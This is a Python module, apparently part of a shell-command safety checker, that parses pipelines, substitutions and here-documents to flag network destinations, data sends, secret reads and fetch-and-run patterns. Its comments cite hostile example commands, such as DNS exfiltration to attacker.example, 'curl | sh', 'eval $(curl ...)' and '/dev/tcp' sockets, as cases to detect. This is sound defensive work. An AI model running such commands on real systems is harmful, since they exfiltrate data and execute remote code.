"""Reading one command: which programs only read, which run code, and what each segment of a pipeline does."""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from itertools import islice
from pathlib import PurePosixPath

from .expand import _BRACED, _expand, _program
from .heredocs import _prepare
from .lexical import (
    _ALWAYS_SENDS,
    _AS_WRITTEN,
    _CLOSERS,
    _COMMAND_FLAG,
    _DEV_TCP,
    _DNS_COMMAND,
    _GAP,
    _GIT_FETCH,
    _GIT_SEND,
    _INTERPRETERS,
    _LOCAL_READ,
    _MAX_CARRIED,
    _MAX_CARRIED_TOTAL,
    _MAX_COMMAND,
    _MAX_EXPANSION,
    _MAX_OPERATORS,
    _MAX_PARTS,
    _NAMES_ONLY,
    _NET_CALL,
    _NETWORK,
    _NETWORK_WORD,
    _OPERATOR_CHARS,
    _OPERATORS,
    _PASS_THROUGH,
    _PLAIN,
    _PLAIN_PROGRAMS,
    _PROGRAM_VARS,
    _PUNCTUATION,
    _QUOTE,
    _READ_ONLY,
    _REDIRECTS,
    _RUNNERS,
    _SECRET_COMMANDS,
    _SEND_CALL,
    _SHELLS,
    _SOCKET_CALL,
    _SPLIT_OPERATORS,
    _STDIN_FILES,
    _SUBSTITUTION,
    _SYNTAX,
    _URL,
    SECRET,
    Command,
    _binary,
    _state,
    _tokens,
    host,
    is_loopback,
)
from .network import _curl_sends, _downloads, _dynamic, _git_sub, _httpie_sends, _positionals, _wget_sends, network_values
from .programs import _known_program, _local_dev, _read_only
from .windows import _backstops


def _xargs(argv: list[str], text: str) -> list[str]:
    """``argv`` of an ``xargs`` with the text it reads from stdin: put in place of its replace string
    (``-I{}``, ``-i``, ``--replace=R``), or else at the end of the command."""
    replace = ""
    for k, arg in enumerate(argv):
        if arg == "-I" and k + 1 < len(argv):
            replace = argv[k + 1]
        elif arg.startswith("-I") or arg.startswith("--replace="):
            replace = arg[2:] if arg.startswith("-I") else arg.partition("=")[2]
        elif arg in ("-i", "--replace"):
            replace = "{}"
        elif arg.startswith("-i"):
            replace = arg[2:]
    if replace and any(replace in arg for arg in argv):
        return [arg.replace(replace, text) if replace in arg else arg for arg in argv]
    if any(re.fullmatch(r"-[A-Za-z]*0[A-Za-z]*|--null|-d.*|--delimiter(?:=.*)?", arg) for arg in argv[1:]):
        return argv + [text]  # -0 and -d: the text is one argument, not words: echo 'curl ..' | xargs -0 sh -c
    return argv + text.split()


def _runs(word: str) -> bool:
    first = word.split(None, 1)
    return bool(first) and _binary(first[0]) in _RUNNERS


def _unknown(name: str, args: list[str], piped_in: bool, found: Command, depth: int, env: dict[str, str],
             loopvars: frozenset[str]) -> None:
    """A program this does not know: it may run what follows (``setsid curl ...``, ``flock f curl ...``, ``docker
    run IMAGE curl ...``), and an address among its arguments is one it reaches. ``name`` is the word as
    written, since ``curl${IFS}-d${IFS}URL`` is one."""
    text = " ".join([name, *args])
    if depth < 3:
        runs = next((k for k, arg in enumerate(args[:40]) if _runs(arg)), None)
        if runs is not None:
            inner = Command()
            if re.search(r"\s", args[runs]):
                _merge(inner, parse(args[runs], depth + 1, env, loopvars))
            else:
                _segment(args[runs:], piped_in, inner, depth + 1, env, loopvars)
            if inner.destinations or inner.secrets or inner.runs_fetched:
                _merge(found, inner)
        elif word := _NETWORK_WORD.search(text):  # awk 'BEGIN{system("curl ...")}': a tool named inside a string
            inner = parse(text[word.start():], depth + 1, env, loopvars)
            if inner.destinations:
                _merge(found, inner)
    destinations = network_values(text) if re.search(r"[.:@]", text) else set()
    if destinations:
        found.destinations |= destinations
        outside = any(not is_loopback(v) for v in destinations)
        found.remote |= outside
        found.fetches += 1
        # An address in the arguments is not an upload by itself (``docker run ghcr.io/x/y`` is not): it takes a
        # URL with data on it, in a pipe, or in the options.
        explicit = any(not is_loopback(v) for url in _URL.findall(text) for v in network_values(url))
        found.sends |= explicit and (piped_in or _curl_sends(args) or _dynamic(text, loopvars))


def _url_host(url: str) -> str:
    return re.sub(r"^[a-z]+://(?:[^@/]*@)?([^/:]+).*$", r"\1", url, flags=re.I)


def _run_value(value: str, found: Command, depth: int, env: dict[str, str], loopvars: frozenset[str]) -> None:
    """A value that names a program to run (``GIT_SSH_COMMAND``, ``git -c core.fsmonitor=...``): what it reaches
    counts for the command."""
    if value and (_NETWORK_WORD.search(value) or _URL.search(value)):
        inner = parse(value, depth + 1, env, loopvars)
        if inner.destinations or inner.secrets or inner.runs_fetched:
            _merge(found, inner)


def _program_variables(words: list[str], found: Command, depth: int, env: dict[str, str],
                       loopvars: frozenset[str]) -> None:
    """``PAGER='curl ...' man ls``, ``export GIT_SSH_COMMAND=...``: a variable that names a program makes the
    command run one, so it is not read-only, and what the program reaches counts."""
    for word in words:
        m = re.fullmatch(r"([A-Za-z_]\w*)=(.*)", word, re.S)
        if m and (m[1] in _PROGRAM_VARS or m[1].startswith("GIT_CONFIG_")):
            value = m[2].strip()
            if value not in _PLAIN_PROGRAMS:
                found.read_only = False
                found.ordinary = False
                _run_value(value, found, depth, env, loopvars)


def _run_string(code: str, found: Command, depth: int, env: dict[str, str], loopvars: frozenset[str]) -> None:
    """A string a shell or ``eval`` runs. When it is a command's output (``sh -c "$(curl ...)"``), it is code
    fetched from there."""
    inner = parse(code, depth + 1, env, loopvars)
    _merge(found, inner)
    if re.match(r"\s*(?:\$\(|`)", code) and inner.destinations and inner.fetches:
        found.runs_fetched = True


# The key file named by -i of ssh, scp, sftp or rsync's ssh command (or IdentityFile=) signs a login: it is used here, not read
# out or sent. A key named anywhere else in the command, as a file to copy or in the remote command, still counts.
_AUTH_PROGRAMS = frozenset({"ssh", "scp", "sftp", "rsync", "sshfs", "mosh"})
_IDENTITY = re.compile(r"(?<![\w-])(?:-i[ \t]*|IdentityFile[= \t]+)(?:'[^']*'|\"[^\"]*\"|\S+)")


def _without_identity(name: str, words: list[str]) -> list[str]:
    """``words`` of an ssh-family command without the key files that only sign the login."""
    if name not in _AUTH_PROGRAMS:
        return words
    out: list[str] = []
    skip = False
    for word in words:
        if skip:
            skip = False
        elif word == "-i":
            skip = True
        elif re.match(r"(?:-i[~/$.]|-?o?IdentityFile=)", word, re.I):
            continue
        else:  # rsync -e 'ssh -i KEY', mosh --ssh='ssh -i KEY'
            out.append(_IDENTITY.sub("", word) if re.search(r"\bssh[ \t]", word) else word)
    return out


def _segment(argv: list[str], piped_in: bool, found: Command, depth: int, env: dict[str, str],
             loopvars: frozenset[str]) -> tuple[str, bool]:
    """Reads one simple command into ``found``; returns its program name ("" if none) and whether it runs a
    program it reads on stdin (``sh``, ``python -``, not ``python3 -c '...'``, which reads data there)."""
    if PurePosixPath(argv[0]).name in ("env", "set") and all("=" in a or a.startswith("-") for a in argv[1:]):
        found.secrets.append(argv[0])  # with no command to run, env and set print every variable
    whole, argv = argv, _program(argv)
    if depth < 3:
        _program_variables(whole, found, depth, env, loopvars)
    if not argv:
        return "", False
    name = _binary(argv[0])
    args = argv[1:]
    if name not in _NAMES_ONLY:
        found.secrets += [a for a in _without_identity(name, whole) if SECRET.search(a)]
    runs_stdin = (name in _SHELLS or name in _INTERPRETERS) and all(a.startswith("-") and a not in ("-c", "-e")
                                                                    or a == "-" or a in _STDIN_FILES for a in args)
    if (argv[0] == "." or name == "source") and args[:1] and args[0] in _STDIN_FILES:
        name, runs_stdin = "sh", True  # echo 'curl ...' | source /dev/stdin
    if name in _INTERPRETERS and "-" in args and not any(a in ("-c", "-e") for a in args):
        runs_stdin = True  # python3 - arg
    if name in _SHELLS and any(re.fullmatch(r"-[abd-z]*s[a-z]*", a) for a in args):
        runs_stdin = True  # bash -s stable
    if any(tuple(a.lower() for a in argv[:len(cmd)]) == cmd for cmd in _SECRET_COMMANDS):
        found.secrets.append(" ".join(argv[:3]))
    known = _known_program(argv[0])
    read_only = known and _read_only(name, args)
    if not read_only and not (_downloads(name, args) and not piped_in):
        found.read_only = False
        found.ordinary &= known and _local_dev(name, args, whole)
    flag = next((i for i, a in enumerate(args) if re.fullmatch(r"-[a-z]*c", a)), None)  # -c, -lc
    if name in _COMMAND_FLAG and flag is not None and depth < 3:
        rest = args[flag + 1:]
        while rest and rest[0] == "--":
            rest = rest[1:]
        _run_string(rest[0] if rest else "", found, depth, env, loopvars)
        return name, False
    if name == "eval" and depth < 3:  # its arguments are a command
        _run_string(" ".join(args), found, depth, env, loopvars)
        return name, False
    text = " ".join(args)
    sub, rest, configs = _git_sub(args) if name == "git" else ("", args, [])
    for config in configs if depth < 3 else ():  # git -c alias.x='!curl ...' x, --config-env=core.fsmonitor=VAR
        value = (env.get(config[4:].partition("=")[2], "") if config.startswith("env:") else config.partition("=")[2])
        _run_value(value.lstrip("!"), found, depth, env, loopvars)
    s_client = name == "openssl" and args[:1] in (["s_client"], ["s_server"])
    if name in _NETWORK or s_client or (name == "git" and (sub in _GIT_FETCH | _GIT_SEND or sub == "remote")):
        destinations = network_values(text)
        if name in ("scp", "rsync"):  # user@host:path, host:path, rsync://host/path
            remotes = [a for a in args if re.match(r"(?:[\w.+-]+@)?[\w.-]+\.[\w.-]+:", a) and "://" not in a
                       or re.match(r"(?:rsync|scp|sftp|ssh)://", a)]
            destinations |= {v for a in remotes for v in network_values(a.partition(":")[0])}
            # rsync://host/module: the host as well, which is what an output names
            destinations |= {v for a in remotes if "://" in a for v in network_values(_url_host(a))}
            found.sends |= bool(remotes) and remotes[-1] == _positionals(args, "PioFclSe")[-1]
        if name in ("ssh", "scp", "rsync", "sftp", "git"):  # user@host is a login here, not an email address
            destinations |= {v.rpartition("@")[2] for v in destinations if "@" in v and "://" not in v}
        found.destinations |= destinations
        found.remote |= any(not is_loopback(v) for v in destinations)
        found.fetches += bool(destinations)
        found.sends |= (
            name in _ALWAYS_SENDS or s_client or piped_in
            or (name in ("curl", "curlie") and _curl_sends(args)) or (name == "wget" and _wget_sends(args))
            or (name in ("curl", "wget", "http", "https", "xh", "aria2c", "curlie", "axel", "lynx", "w3m", "lwp-request")
                and _dynamic(text, loopvars))
            or (name == "git" and any(c.lower().startswith(("http", "url.")) and _dynamic(c, loopvars)
                                      for c in configs))  # git -c http.extraHeader="X: $(cat f)" fetch URL
            or (name in ("http", "https", "xh", "curlie") and _httpie_sends(args))
            or (name == "git" and (sub in _GIT_SEND or sub == "remote" and rest[:1] in (["add"], ["set-url"])))
            or (name in ("dig", "nslookup", "host", "ping") and bool(re.search(r"\$|`", text))))
    elif name in ("gh", "glab") and not (args and args[0] in ("auth", "config", "alias", "completion")):
        found.remote = True  # issues, pull requests, CI logs: text anyone can write
    elif name in _INTERPRETERS and (any(a in ("-c", "-e", "-E", "-p", "--eval", "--print", "-r") for a in args)
                                    or name in ("deno", "bun") and args[:1] == ["eval"]):
        _code(text, found, depth)
    elif name in _SYNTAX:  # for u in https://a https://b; case $x in ...: words of the language, not programs
        if name in ("for", "select"):
            found.destinations |= network_values(text)
            found.remote |= any(not is_loopback(v) for v in found.destinations)
    elif not (read_only and name in _READ_ONLY) and name not in ("git", "gh", "glab"):  # fd -x CMD, rg --pre CMD
        _unknown(argv[0], args, piped_in, found, depth, env, loopvars)
    return name, runs_stdin


def _strings(code: str) -> list[tuple[int, int, str]] | None:
    """The quoted strings of ``code`` as (start, end, text), read in one pass. A quote that is never closed is
    skipped, and each such quote reads to the end of the text: after a few of them, None (not read)."""
    found: list[tuple[int, int, str]] = []
    i = 0
    n = len(code)
    budget = 4 * n + 1000
    while True:
        m = _QUOTE.search(code, i)
        if not m:
            return found
        close = _CLOSERS[m[0]].match(code, m.end())
        if close:
            found.append((m.start(), close.end(), code[m.end():close.end() - 1]))
            i = close.end()
        else:
            budget -= n - m.end()
            if budget < 0:
                return None
            i = m.end()


def _code(code: str, found: Command, depth: int = 0) -> None:
    """Inline program text: the addresses it reaches when it calls a network client, and whether it sends data.
    A URL in a string (a docs link, a constant) is not a request."""
    if depth < 3:  # a string handed to the shell (os.system('curl ...'), execSync(`wget ...`)) is a command
        strings = _strings(code)
        if strings is None:  # too ragged to read the strings: read the raw text
            found.read_only = False
            found.ordinary = False
            _opaque(code, found)
        else:
            for _, _, literal in strings[:2 * _MAX_PARTS]:
                if _NETWORK_WORD.search(literal):
                    _merge(found, parse(literal, depth + 1))
            # an argument list, ['curl', '-d', '@f', URL] or system("curl", ...), is a command too
            groups: list[list[str]] = []
            end = -1
            for start, stop, literal in strings:
                if groups and end >= 0 and _GAP.fullmatch(code, end, start):
                    groups[-1].append(literal)
                elif len(groups) < _MAX_PARTS:
                    groups.append([literal])
                else:
                    break
                end = stop
            for words in groups:
                if len(words) > 1 and _NETWORK_WORD.search(words[0]):
                    _merge(found, parse(" ".join(words), depth + 1))
    if not _NET_CALL.search(code):
        return
    destinations = network_values(code)
    found.destinations |= destinations
    found.remote |= any(not is_loopback(v) for v in destinations)
    found.sends |= bool(destinations) and bool(_SEND_CALL.search(code) or _SOCKET_CALL.search(code)
                                              or _LOCAL_READ.search(code))


def _merge(found: Command, inner: Command) -> None:
    found.destinations |= inner.destinations
    found.sends |= inner.sends
    found.secrets += inner.secrets
    found.read_only &= inner.read_only
    found.ordinary &= inner.ordinary
    found.runs_fetched |= inner.runs_fetched
    found.remote |= inner.remote
    found.fetches += inner.fetches


def _substitutions(text: str) -> list[tuple[int, str]] | None:
    """The commands inside the ``$(...)`` and backticks of ``text`` and where each starts; None if there are too
    many to read."""
    found = [(m.start(), m[1] if m[1] is not None else m[2])
             for m in islice(_SUBSTITUTION.finditer(text), _MAX_PARTS + 1)]
    return None if len(found) > _MAX_PARTS else found


def _inner(text: str) -> list[str] | None:
    found = _substitutions(text)
    return None if found is None else [part for _, part in found]


_MASK = re.compile(r"\$\{[^}]*\}|\$\w+|\$\(((?:[^()]|\([^()]*\))*)\)|`[^`]*`")
_RUNS_ARGUMENT = re.compile(r"(?:^|[\s;&|(])(?:eval|(?:ba|z|da|k)?sh(?:\s+-[\w-]+)*\s+-\w*c|source|\.)\s+[\"']?$")


def _opaque(text: str, found: Command) -> None:
    """Code whose text is only known when it runs (``eval "$(cat <<EOF ...)"``, ``sh <(echo ...)``): read from
    the raw text what it can reach, and with a network tool or an address in it, take it to send."""
    found.destinations |= network_values(text)
    found.remote |= any(not is_loopback(v) for v in found.destinations)
    found.sends |= bool(_NETWORK_WORD.search(text)) or found.remote


def _defaults(clean: str, found: Command) -> None:
    """``${U:-attacker.example}``, ``${H/a/attacker.example}``: an address written in a parameter expansion is
    one the command may reach."""
    for body in islice(_BRACED.findall(clean), _MAX_PARTS):
        word = re.sub(r"^[#!]?\w+(?:\[[^\]]*\])?(?::?[-=+?]|//?|##?|%%?|\^\^?|,,?|:)?", "", body)
        found.destinations |= network_values(word.rpartition("/")[2] if "/" in body else word)
    found.remote |= any(not is_loopback(v) for v in found.destinations)


def _masked_hosts(clean: str, found: Command) -> None:
    """``dig $(cat f).attacker.example``, ``dig ${d}.attacker.example``: a host with data in it. The data is the
    first label, and the name server is the domain under it, so both are destinations."""
    if _DNS_COMMAND.search(clean) and re.search(r"\$\w|\$\{|\$\(|`", clean):
        masked = _MASK.sub("x", clean)
        for value in network_values(re.sub(r"(?<=\s)@(?=x)", "", masked)):
            found.destinations.add(value)
            domain = host(value)
            while domain.startswith("x."):
                domain = domain[2:]
            found.destinations |= network_values(domain)
        found.remote |= any(not is_loopback(v) for v in found.destinations)


_FETCH_AND_RUN = re.compile(r"(?<![\w.-])(?:curl|wget)(?![\w:-])[^;&\n|]{0,2000}\|&?\s*(?:(?:sudo|env|command|exec|nohup)\s+)*"
                            r"(?:ba|z|da|k)?sh(?![\w-])")


def _unreadable(command: str, found: Command, expanded: str = "") -> Command:
    """Whatever it is, it is not known to be read-only, and with a network tool or an address in it, it may send
    data: read from the raw text (and from the text with its variables written out) what can be."""
    found.read_only = False
    found.ordinary = False
    for match in _DEV_TCP.finditer(command):
        found.destinations |= network_values(match[1])
        found.sends = True
    found.destinations |= network_values(command)
    if expanded:
        found.destinations |= network_values(expanded)
    _masked_hosts(expanded or command, found)
    _defaults(expanded or command, found)
    # ssh, scp, rsync, git: the user of user@host is a login, and the host is what an output names
    if re.search(r"(?<![\w.-])(?:ssh|scp|rsync|sftp|git)(?![\w:-])", command):
        found.destinations |= {v.rpartition("@")[2] for v in found.destinations if "@" in v and "://" not in v}
        found.destinations |= {h for v in found.destinations if re.match(r"(?:rsync|scp|sftp|ssh)://", v)
                               for h in network_values(_url_host(v))}
    found.remote |= any(not is_loopback(v) for v in found.destinations)
    found.secrets += [w for w in command.split() if SECRET.search(w)]
    found.sends |= bool(_NETWORK_WORD.search(command)) or found.remote
    if found.remote and _FETCH_AND_RUN.search(command):
        found.runs_fetched = True  # curl URL | sh
    return found


def parse(command: str, depth: int = 0, env: dict[str, str] | None = None,
          loops: frozenset[str] = frozenset()) -> Command:
    """What ``command`` does. ``env`` holds the variables, and ``loops`` the loop variables, of the command that
    contains this one (a ``-c`` string, a ``$(...)``, a here-document)."""
    found = _read(command, depth, env, loops)
    if depth == 0:
        _backstops(command, found)
    return found


def _read_nested(command: str, depth: int, env: dict[str, str] | None, loops: frozenset[str],
                 found: Command) -> tuple[dict[str, str], frozenset[str], str, bool, list[str]] | None:
    """The commands that run inside ``command`` (``bash -c`` text, ``$(...)``, a here-document body) merged into ``found``.
    Returns what the read of the words needs: the variables, the loop variables, the text as the shell reads it, whether code is
    made from a command's output, and the tokens. None when the command is not read word by word (``found`` is then complete).
    """
    text, bodies = _prepare(command)
    text, values, ambiguous = _expand(text, env or {})
    clean = text.translate(_AS_WRITTEN)  # what the shell would read, for the scans that look at plain text
    loopvars = loops | frozenset(re.findall(r"\bfor\s+(\w+)\s+in\b", text))
    parts = _substitutions(text)
    if len(bodies) > _MAX_PARTS or parts is None:  # too many to read one by one
        _unreadable(command, found, clean)
        return None
    if any(kind == "opaque" for kind, _ in bodies):  # bash 5.3 ${ cmd; }, or a ${ that is never closed
        _unreadable(command, found, clean)
        return None
    for kind, body in bodies:
        if depth >= 3:
            continue
        if kind == "shell":
            _merge(found, parse(body, depth + 1, values, loopvars))
        elif kind == "code":
            _code(body, found, depth)
        elif kind == "text":  # an unquoted delimiter: the shell runs the substitutions in the body
            for inner in _inner(body) or []:
                _merge(found, parse(inner, depth + 1, None, loopvars))
    if ambiguous:  # a variable's value at its use is not known: read the raw text
        _unreadable(command, found, clean)
        return None
    _defaults(clean, found)
    hidden = False  # code made from the output of a command (eval "$(...)", bash <(...)): not known until it runs
    for start, inner in parts:  # $(...) and `...` run first, and their output goes anywhere
        if depth < 3:
            ran = parse(inner.translate(_AS_WRITTEN), depth + 1, None, loopvars)
            _merge(found, ran)
            if _RUNS_ARGUMENT.search(text[max(0, start - 40):start]):
                hidden = True
                if ran.destinations and ran.fetches:
                    found.runs_fetched = True  # eval $(curl ...), source $(curl ...)
    _masked_hosts(clean, found)
    tokens = _tokens(text)
    if tokens is None:  # unbalanced quotes
        _unreadable(command, found, clean)
        return None
    for match in _DEV_TCP.finditer(clean):  # a bash network socket
        found.destinations |= network_values(match[1])
        found.remote |= any(not is_loopback(v) for v in found.destinations)
        found.sends = True
    return values, loopvars, clean, hidden, tokens


@dataclass
class _Walk:
    """Where the left-to-right read of a command line stands: the words of the stage being read, and what the stages before it
    passed on."""

    argv: list[str] = field(default_factory=list)
    piped_in: bool = False
    carried: str | None = None  # text the stage before passes on: echo 'curl ..' | sh, cat <<< 'curl ..' | sh
    net_stream: bool = False  # what comes in on stdin is a network tool's output
    here: list[str] = field(default_factory=list)
    groups: list[tuple[list[str], bool, int] | None] = field(default_factory=list)  # open "(" groups; <(...) keeps its command
    hidden: bool = False


def _redirect(token: str, pieces: list[str], i: int, w: _Walk, found: Command) -> int:
    """A redirection: what it writes or reads. The index of the next piece."""
    target = pieces[i + 1] if i + 1 < len(pieces) else ""
    nested = target in ("<(", ">(")  # > >(cmd): the target is a process substitution, read as one
    if token.startswith((">", "&>")) and token not in (">&",) and target not in ("/dev/null", "/dev/stderr", "/dev/stdout"):
        found.read_only = False
        found.ordinary = False
    target = target.translate(_PLAIN)
    if token.startswith("<") and SECRET.search(target):
        found.secrets.append(target)
    if token == "<<<":
        w.here.append(target)
    # the digit of "2>" or "0<<<" was taken as an argument; drop it
    if w.argv and w.argv[-1].isdigit() and token.startswith((">", "<")):
        w.argv.pop()
    return i + (1 if nested else 2)


def _stage_input(name: str, w: _Walk, found: Command, depth: int, values: dict[str, str], loopvars: frozenset[str]) -> None:
    """A stage that runs what it is given (``sh``, ``source``): the text the stages before it passed on is code."""
    if depth < 3:
        if w.piped_in and w.carried is not None:  # echo 'curl ...' | sh
            if name in _SHELLS:
                _merge(found, parse(w.carried, depth + 1, values, loopvars))
            else:
                _code(w.carried, found, depth)
        for text_in in w.here:  # sh <<< 'curl ...'
            if name in _SHELLS:
                _merge(found, parse(text_in, depth + 1, values, loopvars))
            else:
                _code(text_in, found, depth)


def _pass_on(name: str, piped: bool, w: _Walk, found: Command) -> None:
    """What the stage that just ended hands to the next one, and whether a hand-over has grown past what is read."""
    given = _program(w.argv)[1:] if w.argv else []
    if not piped:
        w.carried, w.net_stream = None, False
    elif name in ("echo", "printf"):
        w.carried, w.net_stream = " ".join(given), False
    elif name == "cat" and w.here:
        w.carried, w.net_stream = " ".join(w.here), False
    elif not (name in _PASS_THROUGH and w.piped_in):  # tee, tr, sed ...: the same text, the same origin
        w.carried, w.net_stream = None, name in _NETWORK
    w.here = []
    if w.carried is not None:  # xargs echo a | xargs echo a | ...: the text grows at every stage
        _state.carry = getattr(_state, "carry", _MAX_CARRIED_TOTAL) - len(w.carried)
        if len(w.carried) > _MAX_CARRIED or _state.carry < 0:
            w.carried, w.hidden = None, True
            found.read_only = False
            found.ordinary = False


def _close_group(group: tuple[list[str], bool, int], w: _Walk, found: Command) -> None:
    """``<(...)`` ends: its place in the command is a file."""
    outer, outer_piped, fetches = group
    program = _program(outer)
    runner = bool(program) and (program[0] in (".", "source") or _binary(program[0]) in _RUNNERS - _NETWORK)
    w.hidden |= runner
    if runner and found.fetches > fetches:
        found.runs_fetched = True  # bash <(curl ...)
    w.argv, w.piped_in, w.carried, w.net_stream = outer + ["PROCSUB"], outer_piped, None, False


def _end_stage(token: str, w: _Walk, found: Command, depth: int, values: dict[str, str], loopvars: frozenset[str]) -> None:
    """An operator ends the stage being read: it is read, and what it hands on is kept for the next."""
    if w.argv and w.piped_in and w.carried is not None and any(PurePosixPath(word).name == "xargs" for word in w.argv):
        w.argv = _xargs(w.argv, w.carried)
    name, runs_stdin = _segment(w.argv, w.piped_in, found, depth, values, loopvars) if w.argv else ("", False)
    if w.piped_in and w.net_stream and runs_stdin:
        found.runs_fetched = True
    if runs_stdin:
        _stage_input(name, w, found, depth, values, loopvars)
    piped = token in ("|", "|&")
    _pass_on(name, piped, w, found)
    if token == ")" and w.groups and (group := w.groups[-1]) is not None:
        w.groups.pop()
        _close_group(group, w, found)
        return
    if token == "(":
        w.groups.append(None)
    elif token == ")" and w.groups:
        w.groups.pop()
    w.piped_in = piped
    w.argv = []


def _read(command: str, depth: int, env: dict[str, str] | None, loops: frozenset[str]) -> Command:
    found = Command()
    if depth == 0:
        _state.budget = _MAX_EXPANSION
        _state.carry = _MAX_CARRIED_TOTAL
    if len(command) > _MAX_COMMAND or sum(command.count(c) for c in _OPERATOR_CHARS) > _MAX_OPERATORS:
        return _unreadable(command, found)  # not worth tokenizing; read the raw text
    inner_read = _read_nested(command, depth, env, loops, found)
    if inner_read is None:
        return found
    values, loopvars, clean, hidden, tokens = inner_read
    pieces = [piece for token in tokens
              for piece in (_SPLIT_OPERATORS.findall(token) if len(token) > 1 and set(token) <= _PUNCTUATION
                            else [token])]
    w = _Walk(hidden=hidden)
    i = 0
    while i <= len(pieces):
        token = pieces[i] if i < len(pieces) else ";"
        if token in _REDIRECTS:
            i = _redirect(token, pieces, i, w, found)
        elif token in ("<(", ">("):  # process substitution: the commands inside run, their output is a file
            w.groups.append((w.argv, w.piped_in, found.fetches))
            w.argv, w.piped_in, w.carried, w.net_stream = [], False, None, False
            i += 1
        elif token in _OPERATORS or (token and set(token) <= _PUNCTUATION):
            _end_stage(token, w, found, depth, values, loopvars)
            i += 1
        else:
            w.argv.append(token.translate(_PLAIN))
            i += 1
    argv, piped_in, hidden = w.argv, w.piped_in, w.hidden
    if argv:  # a redirection with no target ended the command
        _segment(argv, piped_in, found, depth, values, loopvars)
    # Data in an address: a query or path built from a command's output or from a variable the command does not
    # set itself (a loop variable is not data; "$TOKEN" may be).
    for url in _URL.findall(clean):
        if "$(" in url or url.count("`") > 1 or set(re.findall(r"\$\{?(\w+)", url)) - loopvars:
            found.sends = True
    if hidden:
        _opaque(command, found)
    found.secrets = list(dict.fromkeys(found.secrets))
    return found
